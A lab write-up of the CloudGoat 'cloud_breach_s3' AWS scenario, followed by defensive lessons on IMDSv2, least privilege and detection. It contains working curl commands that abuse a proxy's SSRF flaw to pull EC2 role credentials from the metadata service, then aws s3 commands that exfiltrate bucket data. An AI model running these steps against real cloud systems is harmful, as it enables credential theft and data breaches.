CloudGoat — Write-up: cloud_breach_s3

Data Breach via SSRF → EC2 Metadata → S3 Exfiltration

Difficulty: Small / Easy · Platform: AWS

1. Executive summary

Starting from a single piece of information — the IP of a misconfigured proxy server, with no AWS credentials — it was possible to steal the IAM role credentials of an EC2 instance and use them to exfiltrate sensitive data from a private S3 bucket. The attack chains a Server-Side Request Forgery (SSRF) against the EC2 Instance Metadata Service (IMDSv1) with an over-permissioned IAM role.

The chain in one line

Misconfigured proxy (SSRF) → reach internal metadata endpoint (IMDSv1) → steal EC2 role credentials → access private S3 bucket → exfiltrate sensitive data.

2. Starting point

Unlike credential-based scenarios, the attacker begins as an external actor with only:

The public IP of a proxy server.
No AWS credentials, no console access.

This models a realistic initial foothold: an exposed, misconfigured service reachable from the internet.

3. Key concepts
SSRF (Server-Side Request Forgery)

A vulnerability where an attacker makes a server perform HTTP requests on their behalf, toward destinations the attacker chooses. Because the request originates from the server, it can reach internal resources the attacker cannot reach directly.

EC2 Instance Metadata Service (IMDS)

Every EC2 instance exposes an internal metadata service at the link-local address 169.254.169.254, reachable only from inside the instance. Among other data, it serves the temporary credentials of the IAM role attached to the instance.

How they combine

The metadata endpoint is only reachable from inside the instance; SSRF lets the attacker make the server issue requests for them. Pointing the SSRF at 169.254.169.254 makes the vulnerable server query its own metadata service and return the role credentials to the attacker.

4. Exploitation step by step
Step 1 — Recon the proxy
bash
curl http://<proxy-ip>

The server responds that it is configured to handle proxy requests — i.e. it forwards requests to a destination the client specifies. This is the SSRF primitive.

Step 2 — Confirm the metadata endpoint is NOT directly reachable
bash
curl http://169.254.169.254/latest/meta-data/

This fails (connection timeout) because the link-local address is only reachable from inside the EC2 instance. This confirms the proxy is the only way in.

Step 3 — Use the proxy to reach the metadata service (SSRF)

The server acts as a classic HTTP proxy, so curl's -x (proxy) option is used to route the request through it:

bash
curl -x http://<proxy-ip>:<port> \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

This returns the name of the IAM role attached to the instance.

Step 4 — Steal the role credentials

Appending the role name to the same path returns the temporary credentials:

bash
curl -x http://<proxy-ip>:<port> \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

The response is a JSON object containing AccessKeyId, SecretAccessKey and Token.

Step 5 — Assume the stolen identity

Export the credentials as environment variables (note: the metadata field Token maps to AWS_SESSION_TOKEN):

bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<Token>

aws sts get-caller-identity

get-caller-identity should now show the assumed EC2 role instead of the original user.

Step 6 — Locate and exfiltrate the data

The stolen role has AmazonS3FullAccess — far more than it should. List and read the bucket:

bash
aws s3 ls
aws s3 ls s3://<bucket-name>/
aws s3 cp s3://<bucket-name>/<file> .

The bucket contains sensitive files (in this lab, synthetic cardholder data). Downloading one confirms the breach — objective complete.

Note: the exfiltrated files (synthetic cardholder CSVs, trophy image) are intentionally excluded from this repository. Publishing files named like real financial data is bad practice even when synthetic.

5. Defensive lessons (blue team)

The attack succeeded because of two independent misconfigurations. Fixing either one would have broken the chain:

IMDSv1 enabled. The metadata service accepted simple GET requests, which SSRF can trivially issue. Enforcing IMDSv2 (http_tokens = "required" in Terraform) requires a prior PUT request to obtain a session token — something a basic SSRF cannot perform. This single change breaks the credential theft.
Over-permissioned role. The EC2 role had AmazonS3FullAccess. Applying least privilege (read-only access to a single specific bucket) would have drastically limited the blast radius even if credentials were stolen.
SSRF in the proxy. The proxy forwarded requests to internal destinations without validation. Input validation / destination allow-listing would prevent reaching 169.254.169.254 at all.
Network controls. Metadata access can be blocked at the host or network level for workloads that don't need it.
Detection. GuardDuty flags the use of EC2 role credentials from outside the instance (the InstanceCredentialExfiltration finding) — a strong signal that credentials were stolen.
Terraform hardening reference
hcl
# Enforce IMDSv2 on the instance
metadata_options {
  http_tokens   = "required"
  http_endpoint = "enabled"
}
6. Environment cleanup

This scenario provisions an EC2 instance, which can incur charges if left running — destroy promptly.

bash
# Drop the stolen credentials first, to return to your real profile
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

# Destroy the scenario (reactivate the venv first: source venv/bin/activate)
cloudgoat destroy cloud_breach_s3

Then verify in the AWS console (EC2, S3, IAM) that nothing tagged cgid is left behind.

7. Concepts to remember
SSRF + IMDS = credential theft. Any SSRF on an EC2 instance running IMDSv1 is a direct path to stealing that instance's role credentials.
IMDSv2 is a cheap, high-impact mitigation. One line of configuration breaks the most common version of this attack.
Least privilege limits blast radius. Stolen credentials are only as dangerous as the permissions behind them.
Defense in depth. The breach required two failures; any single control (IMDSv2, least privilege, SSRF validation) would have stopped it.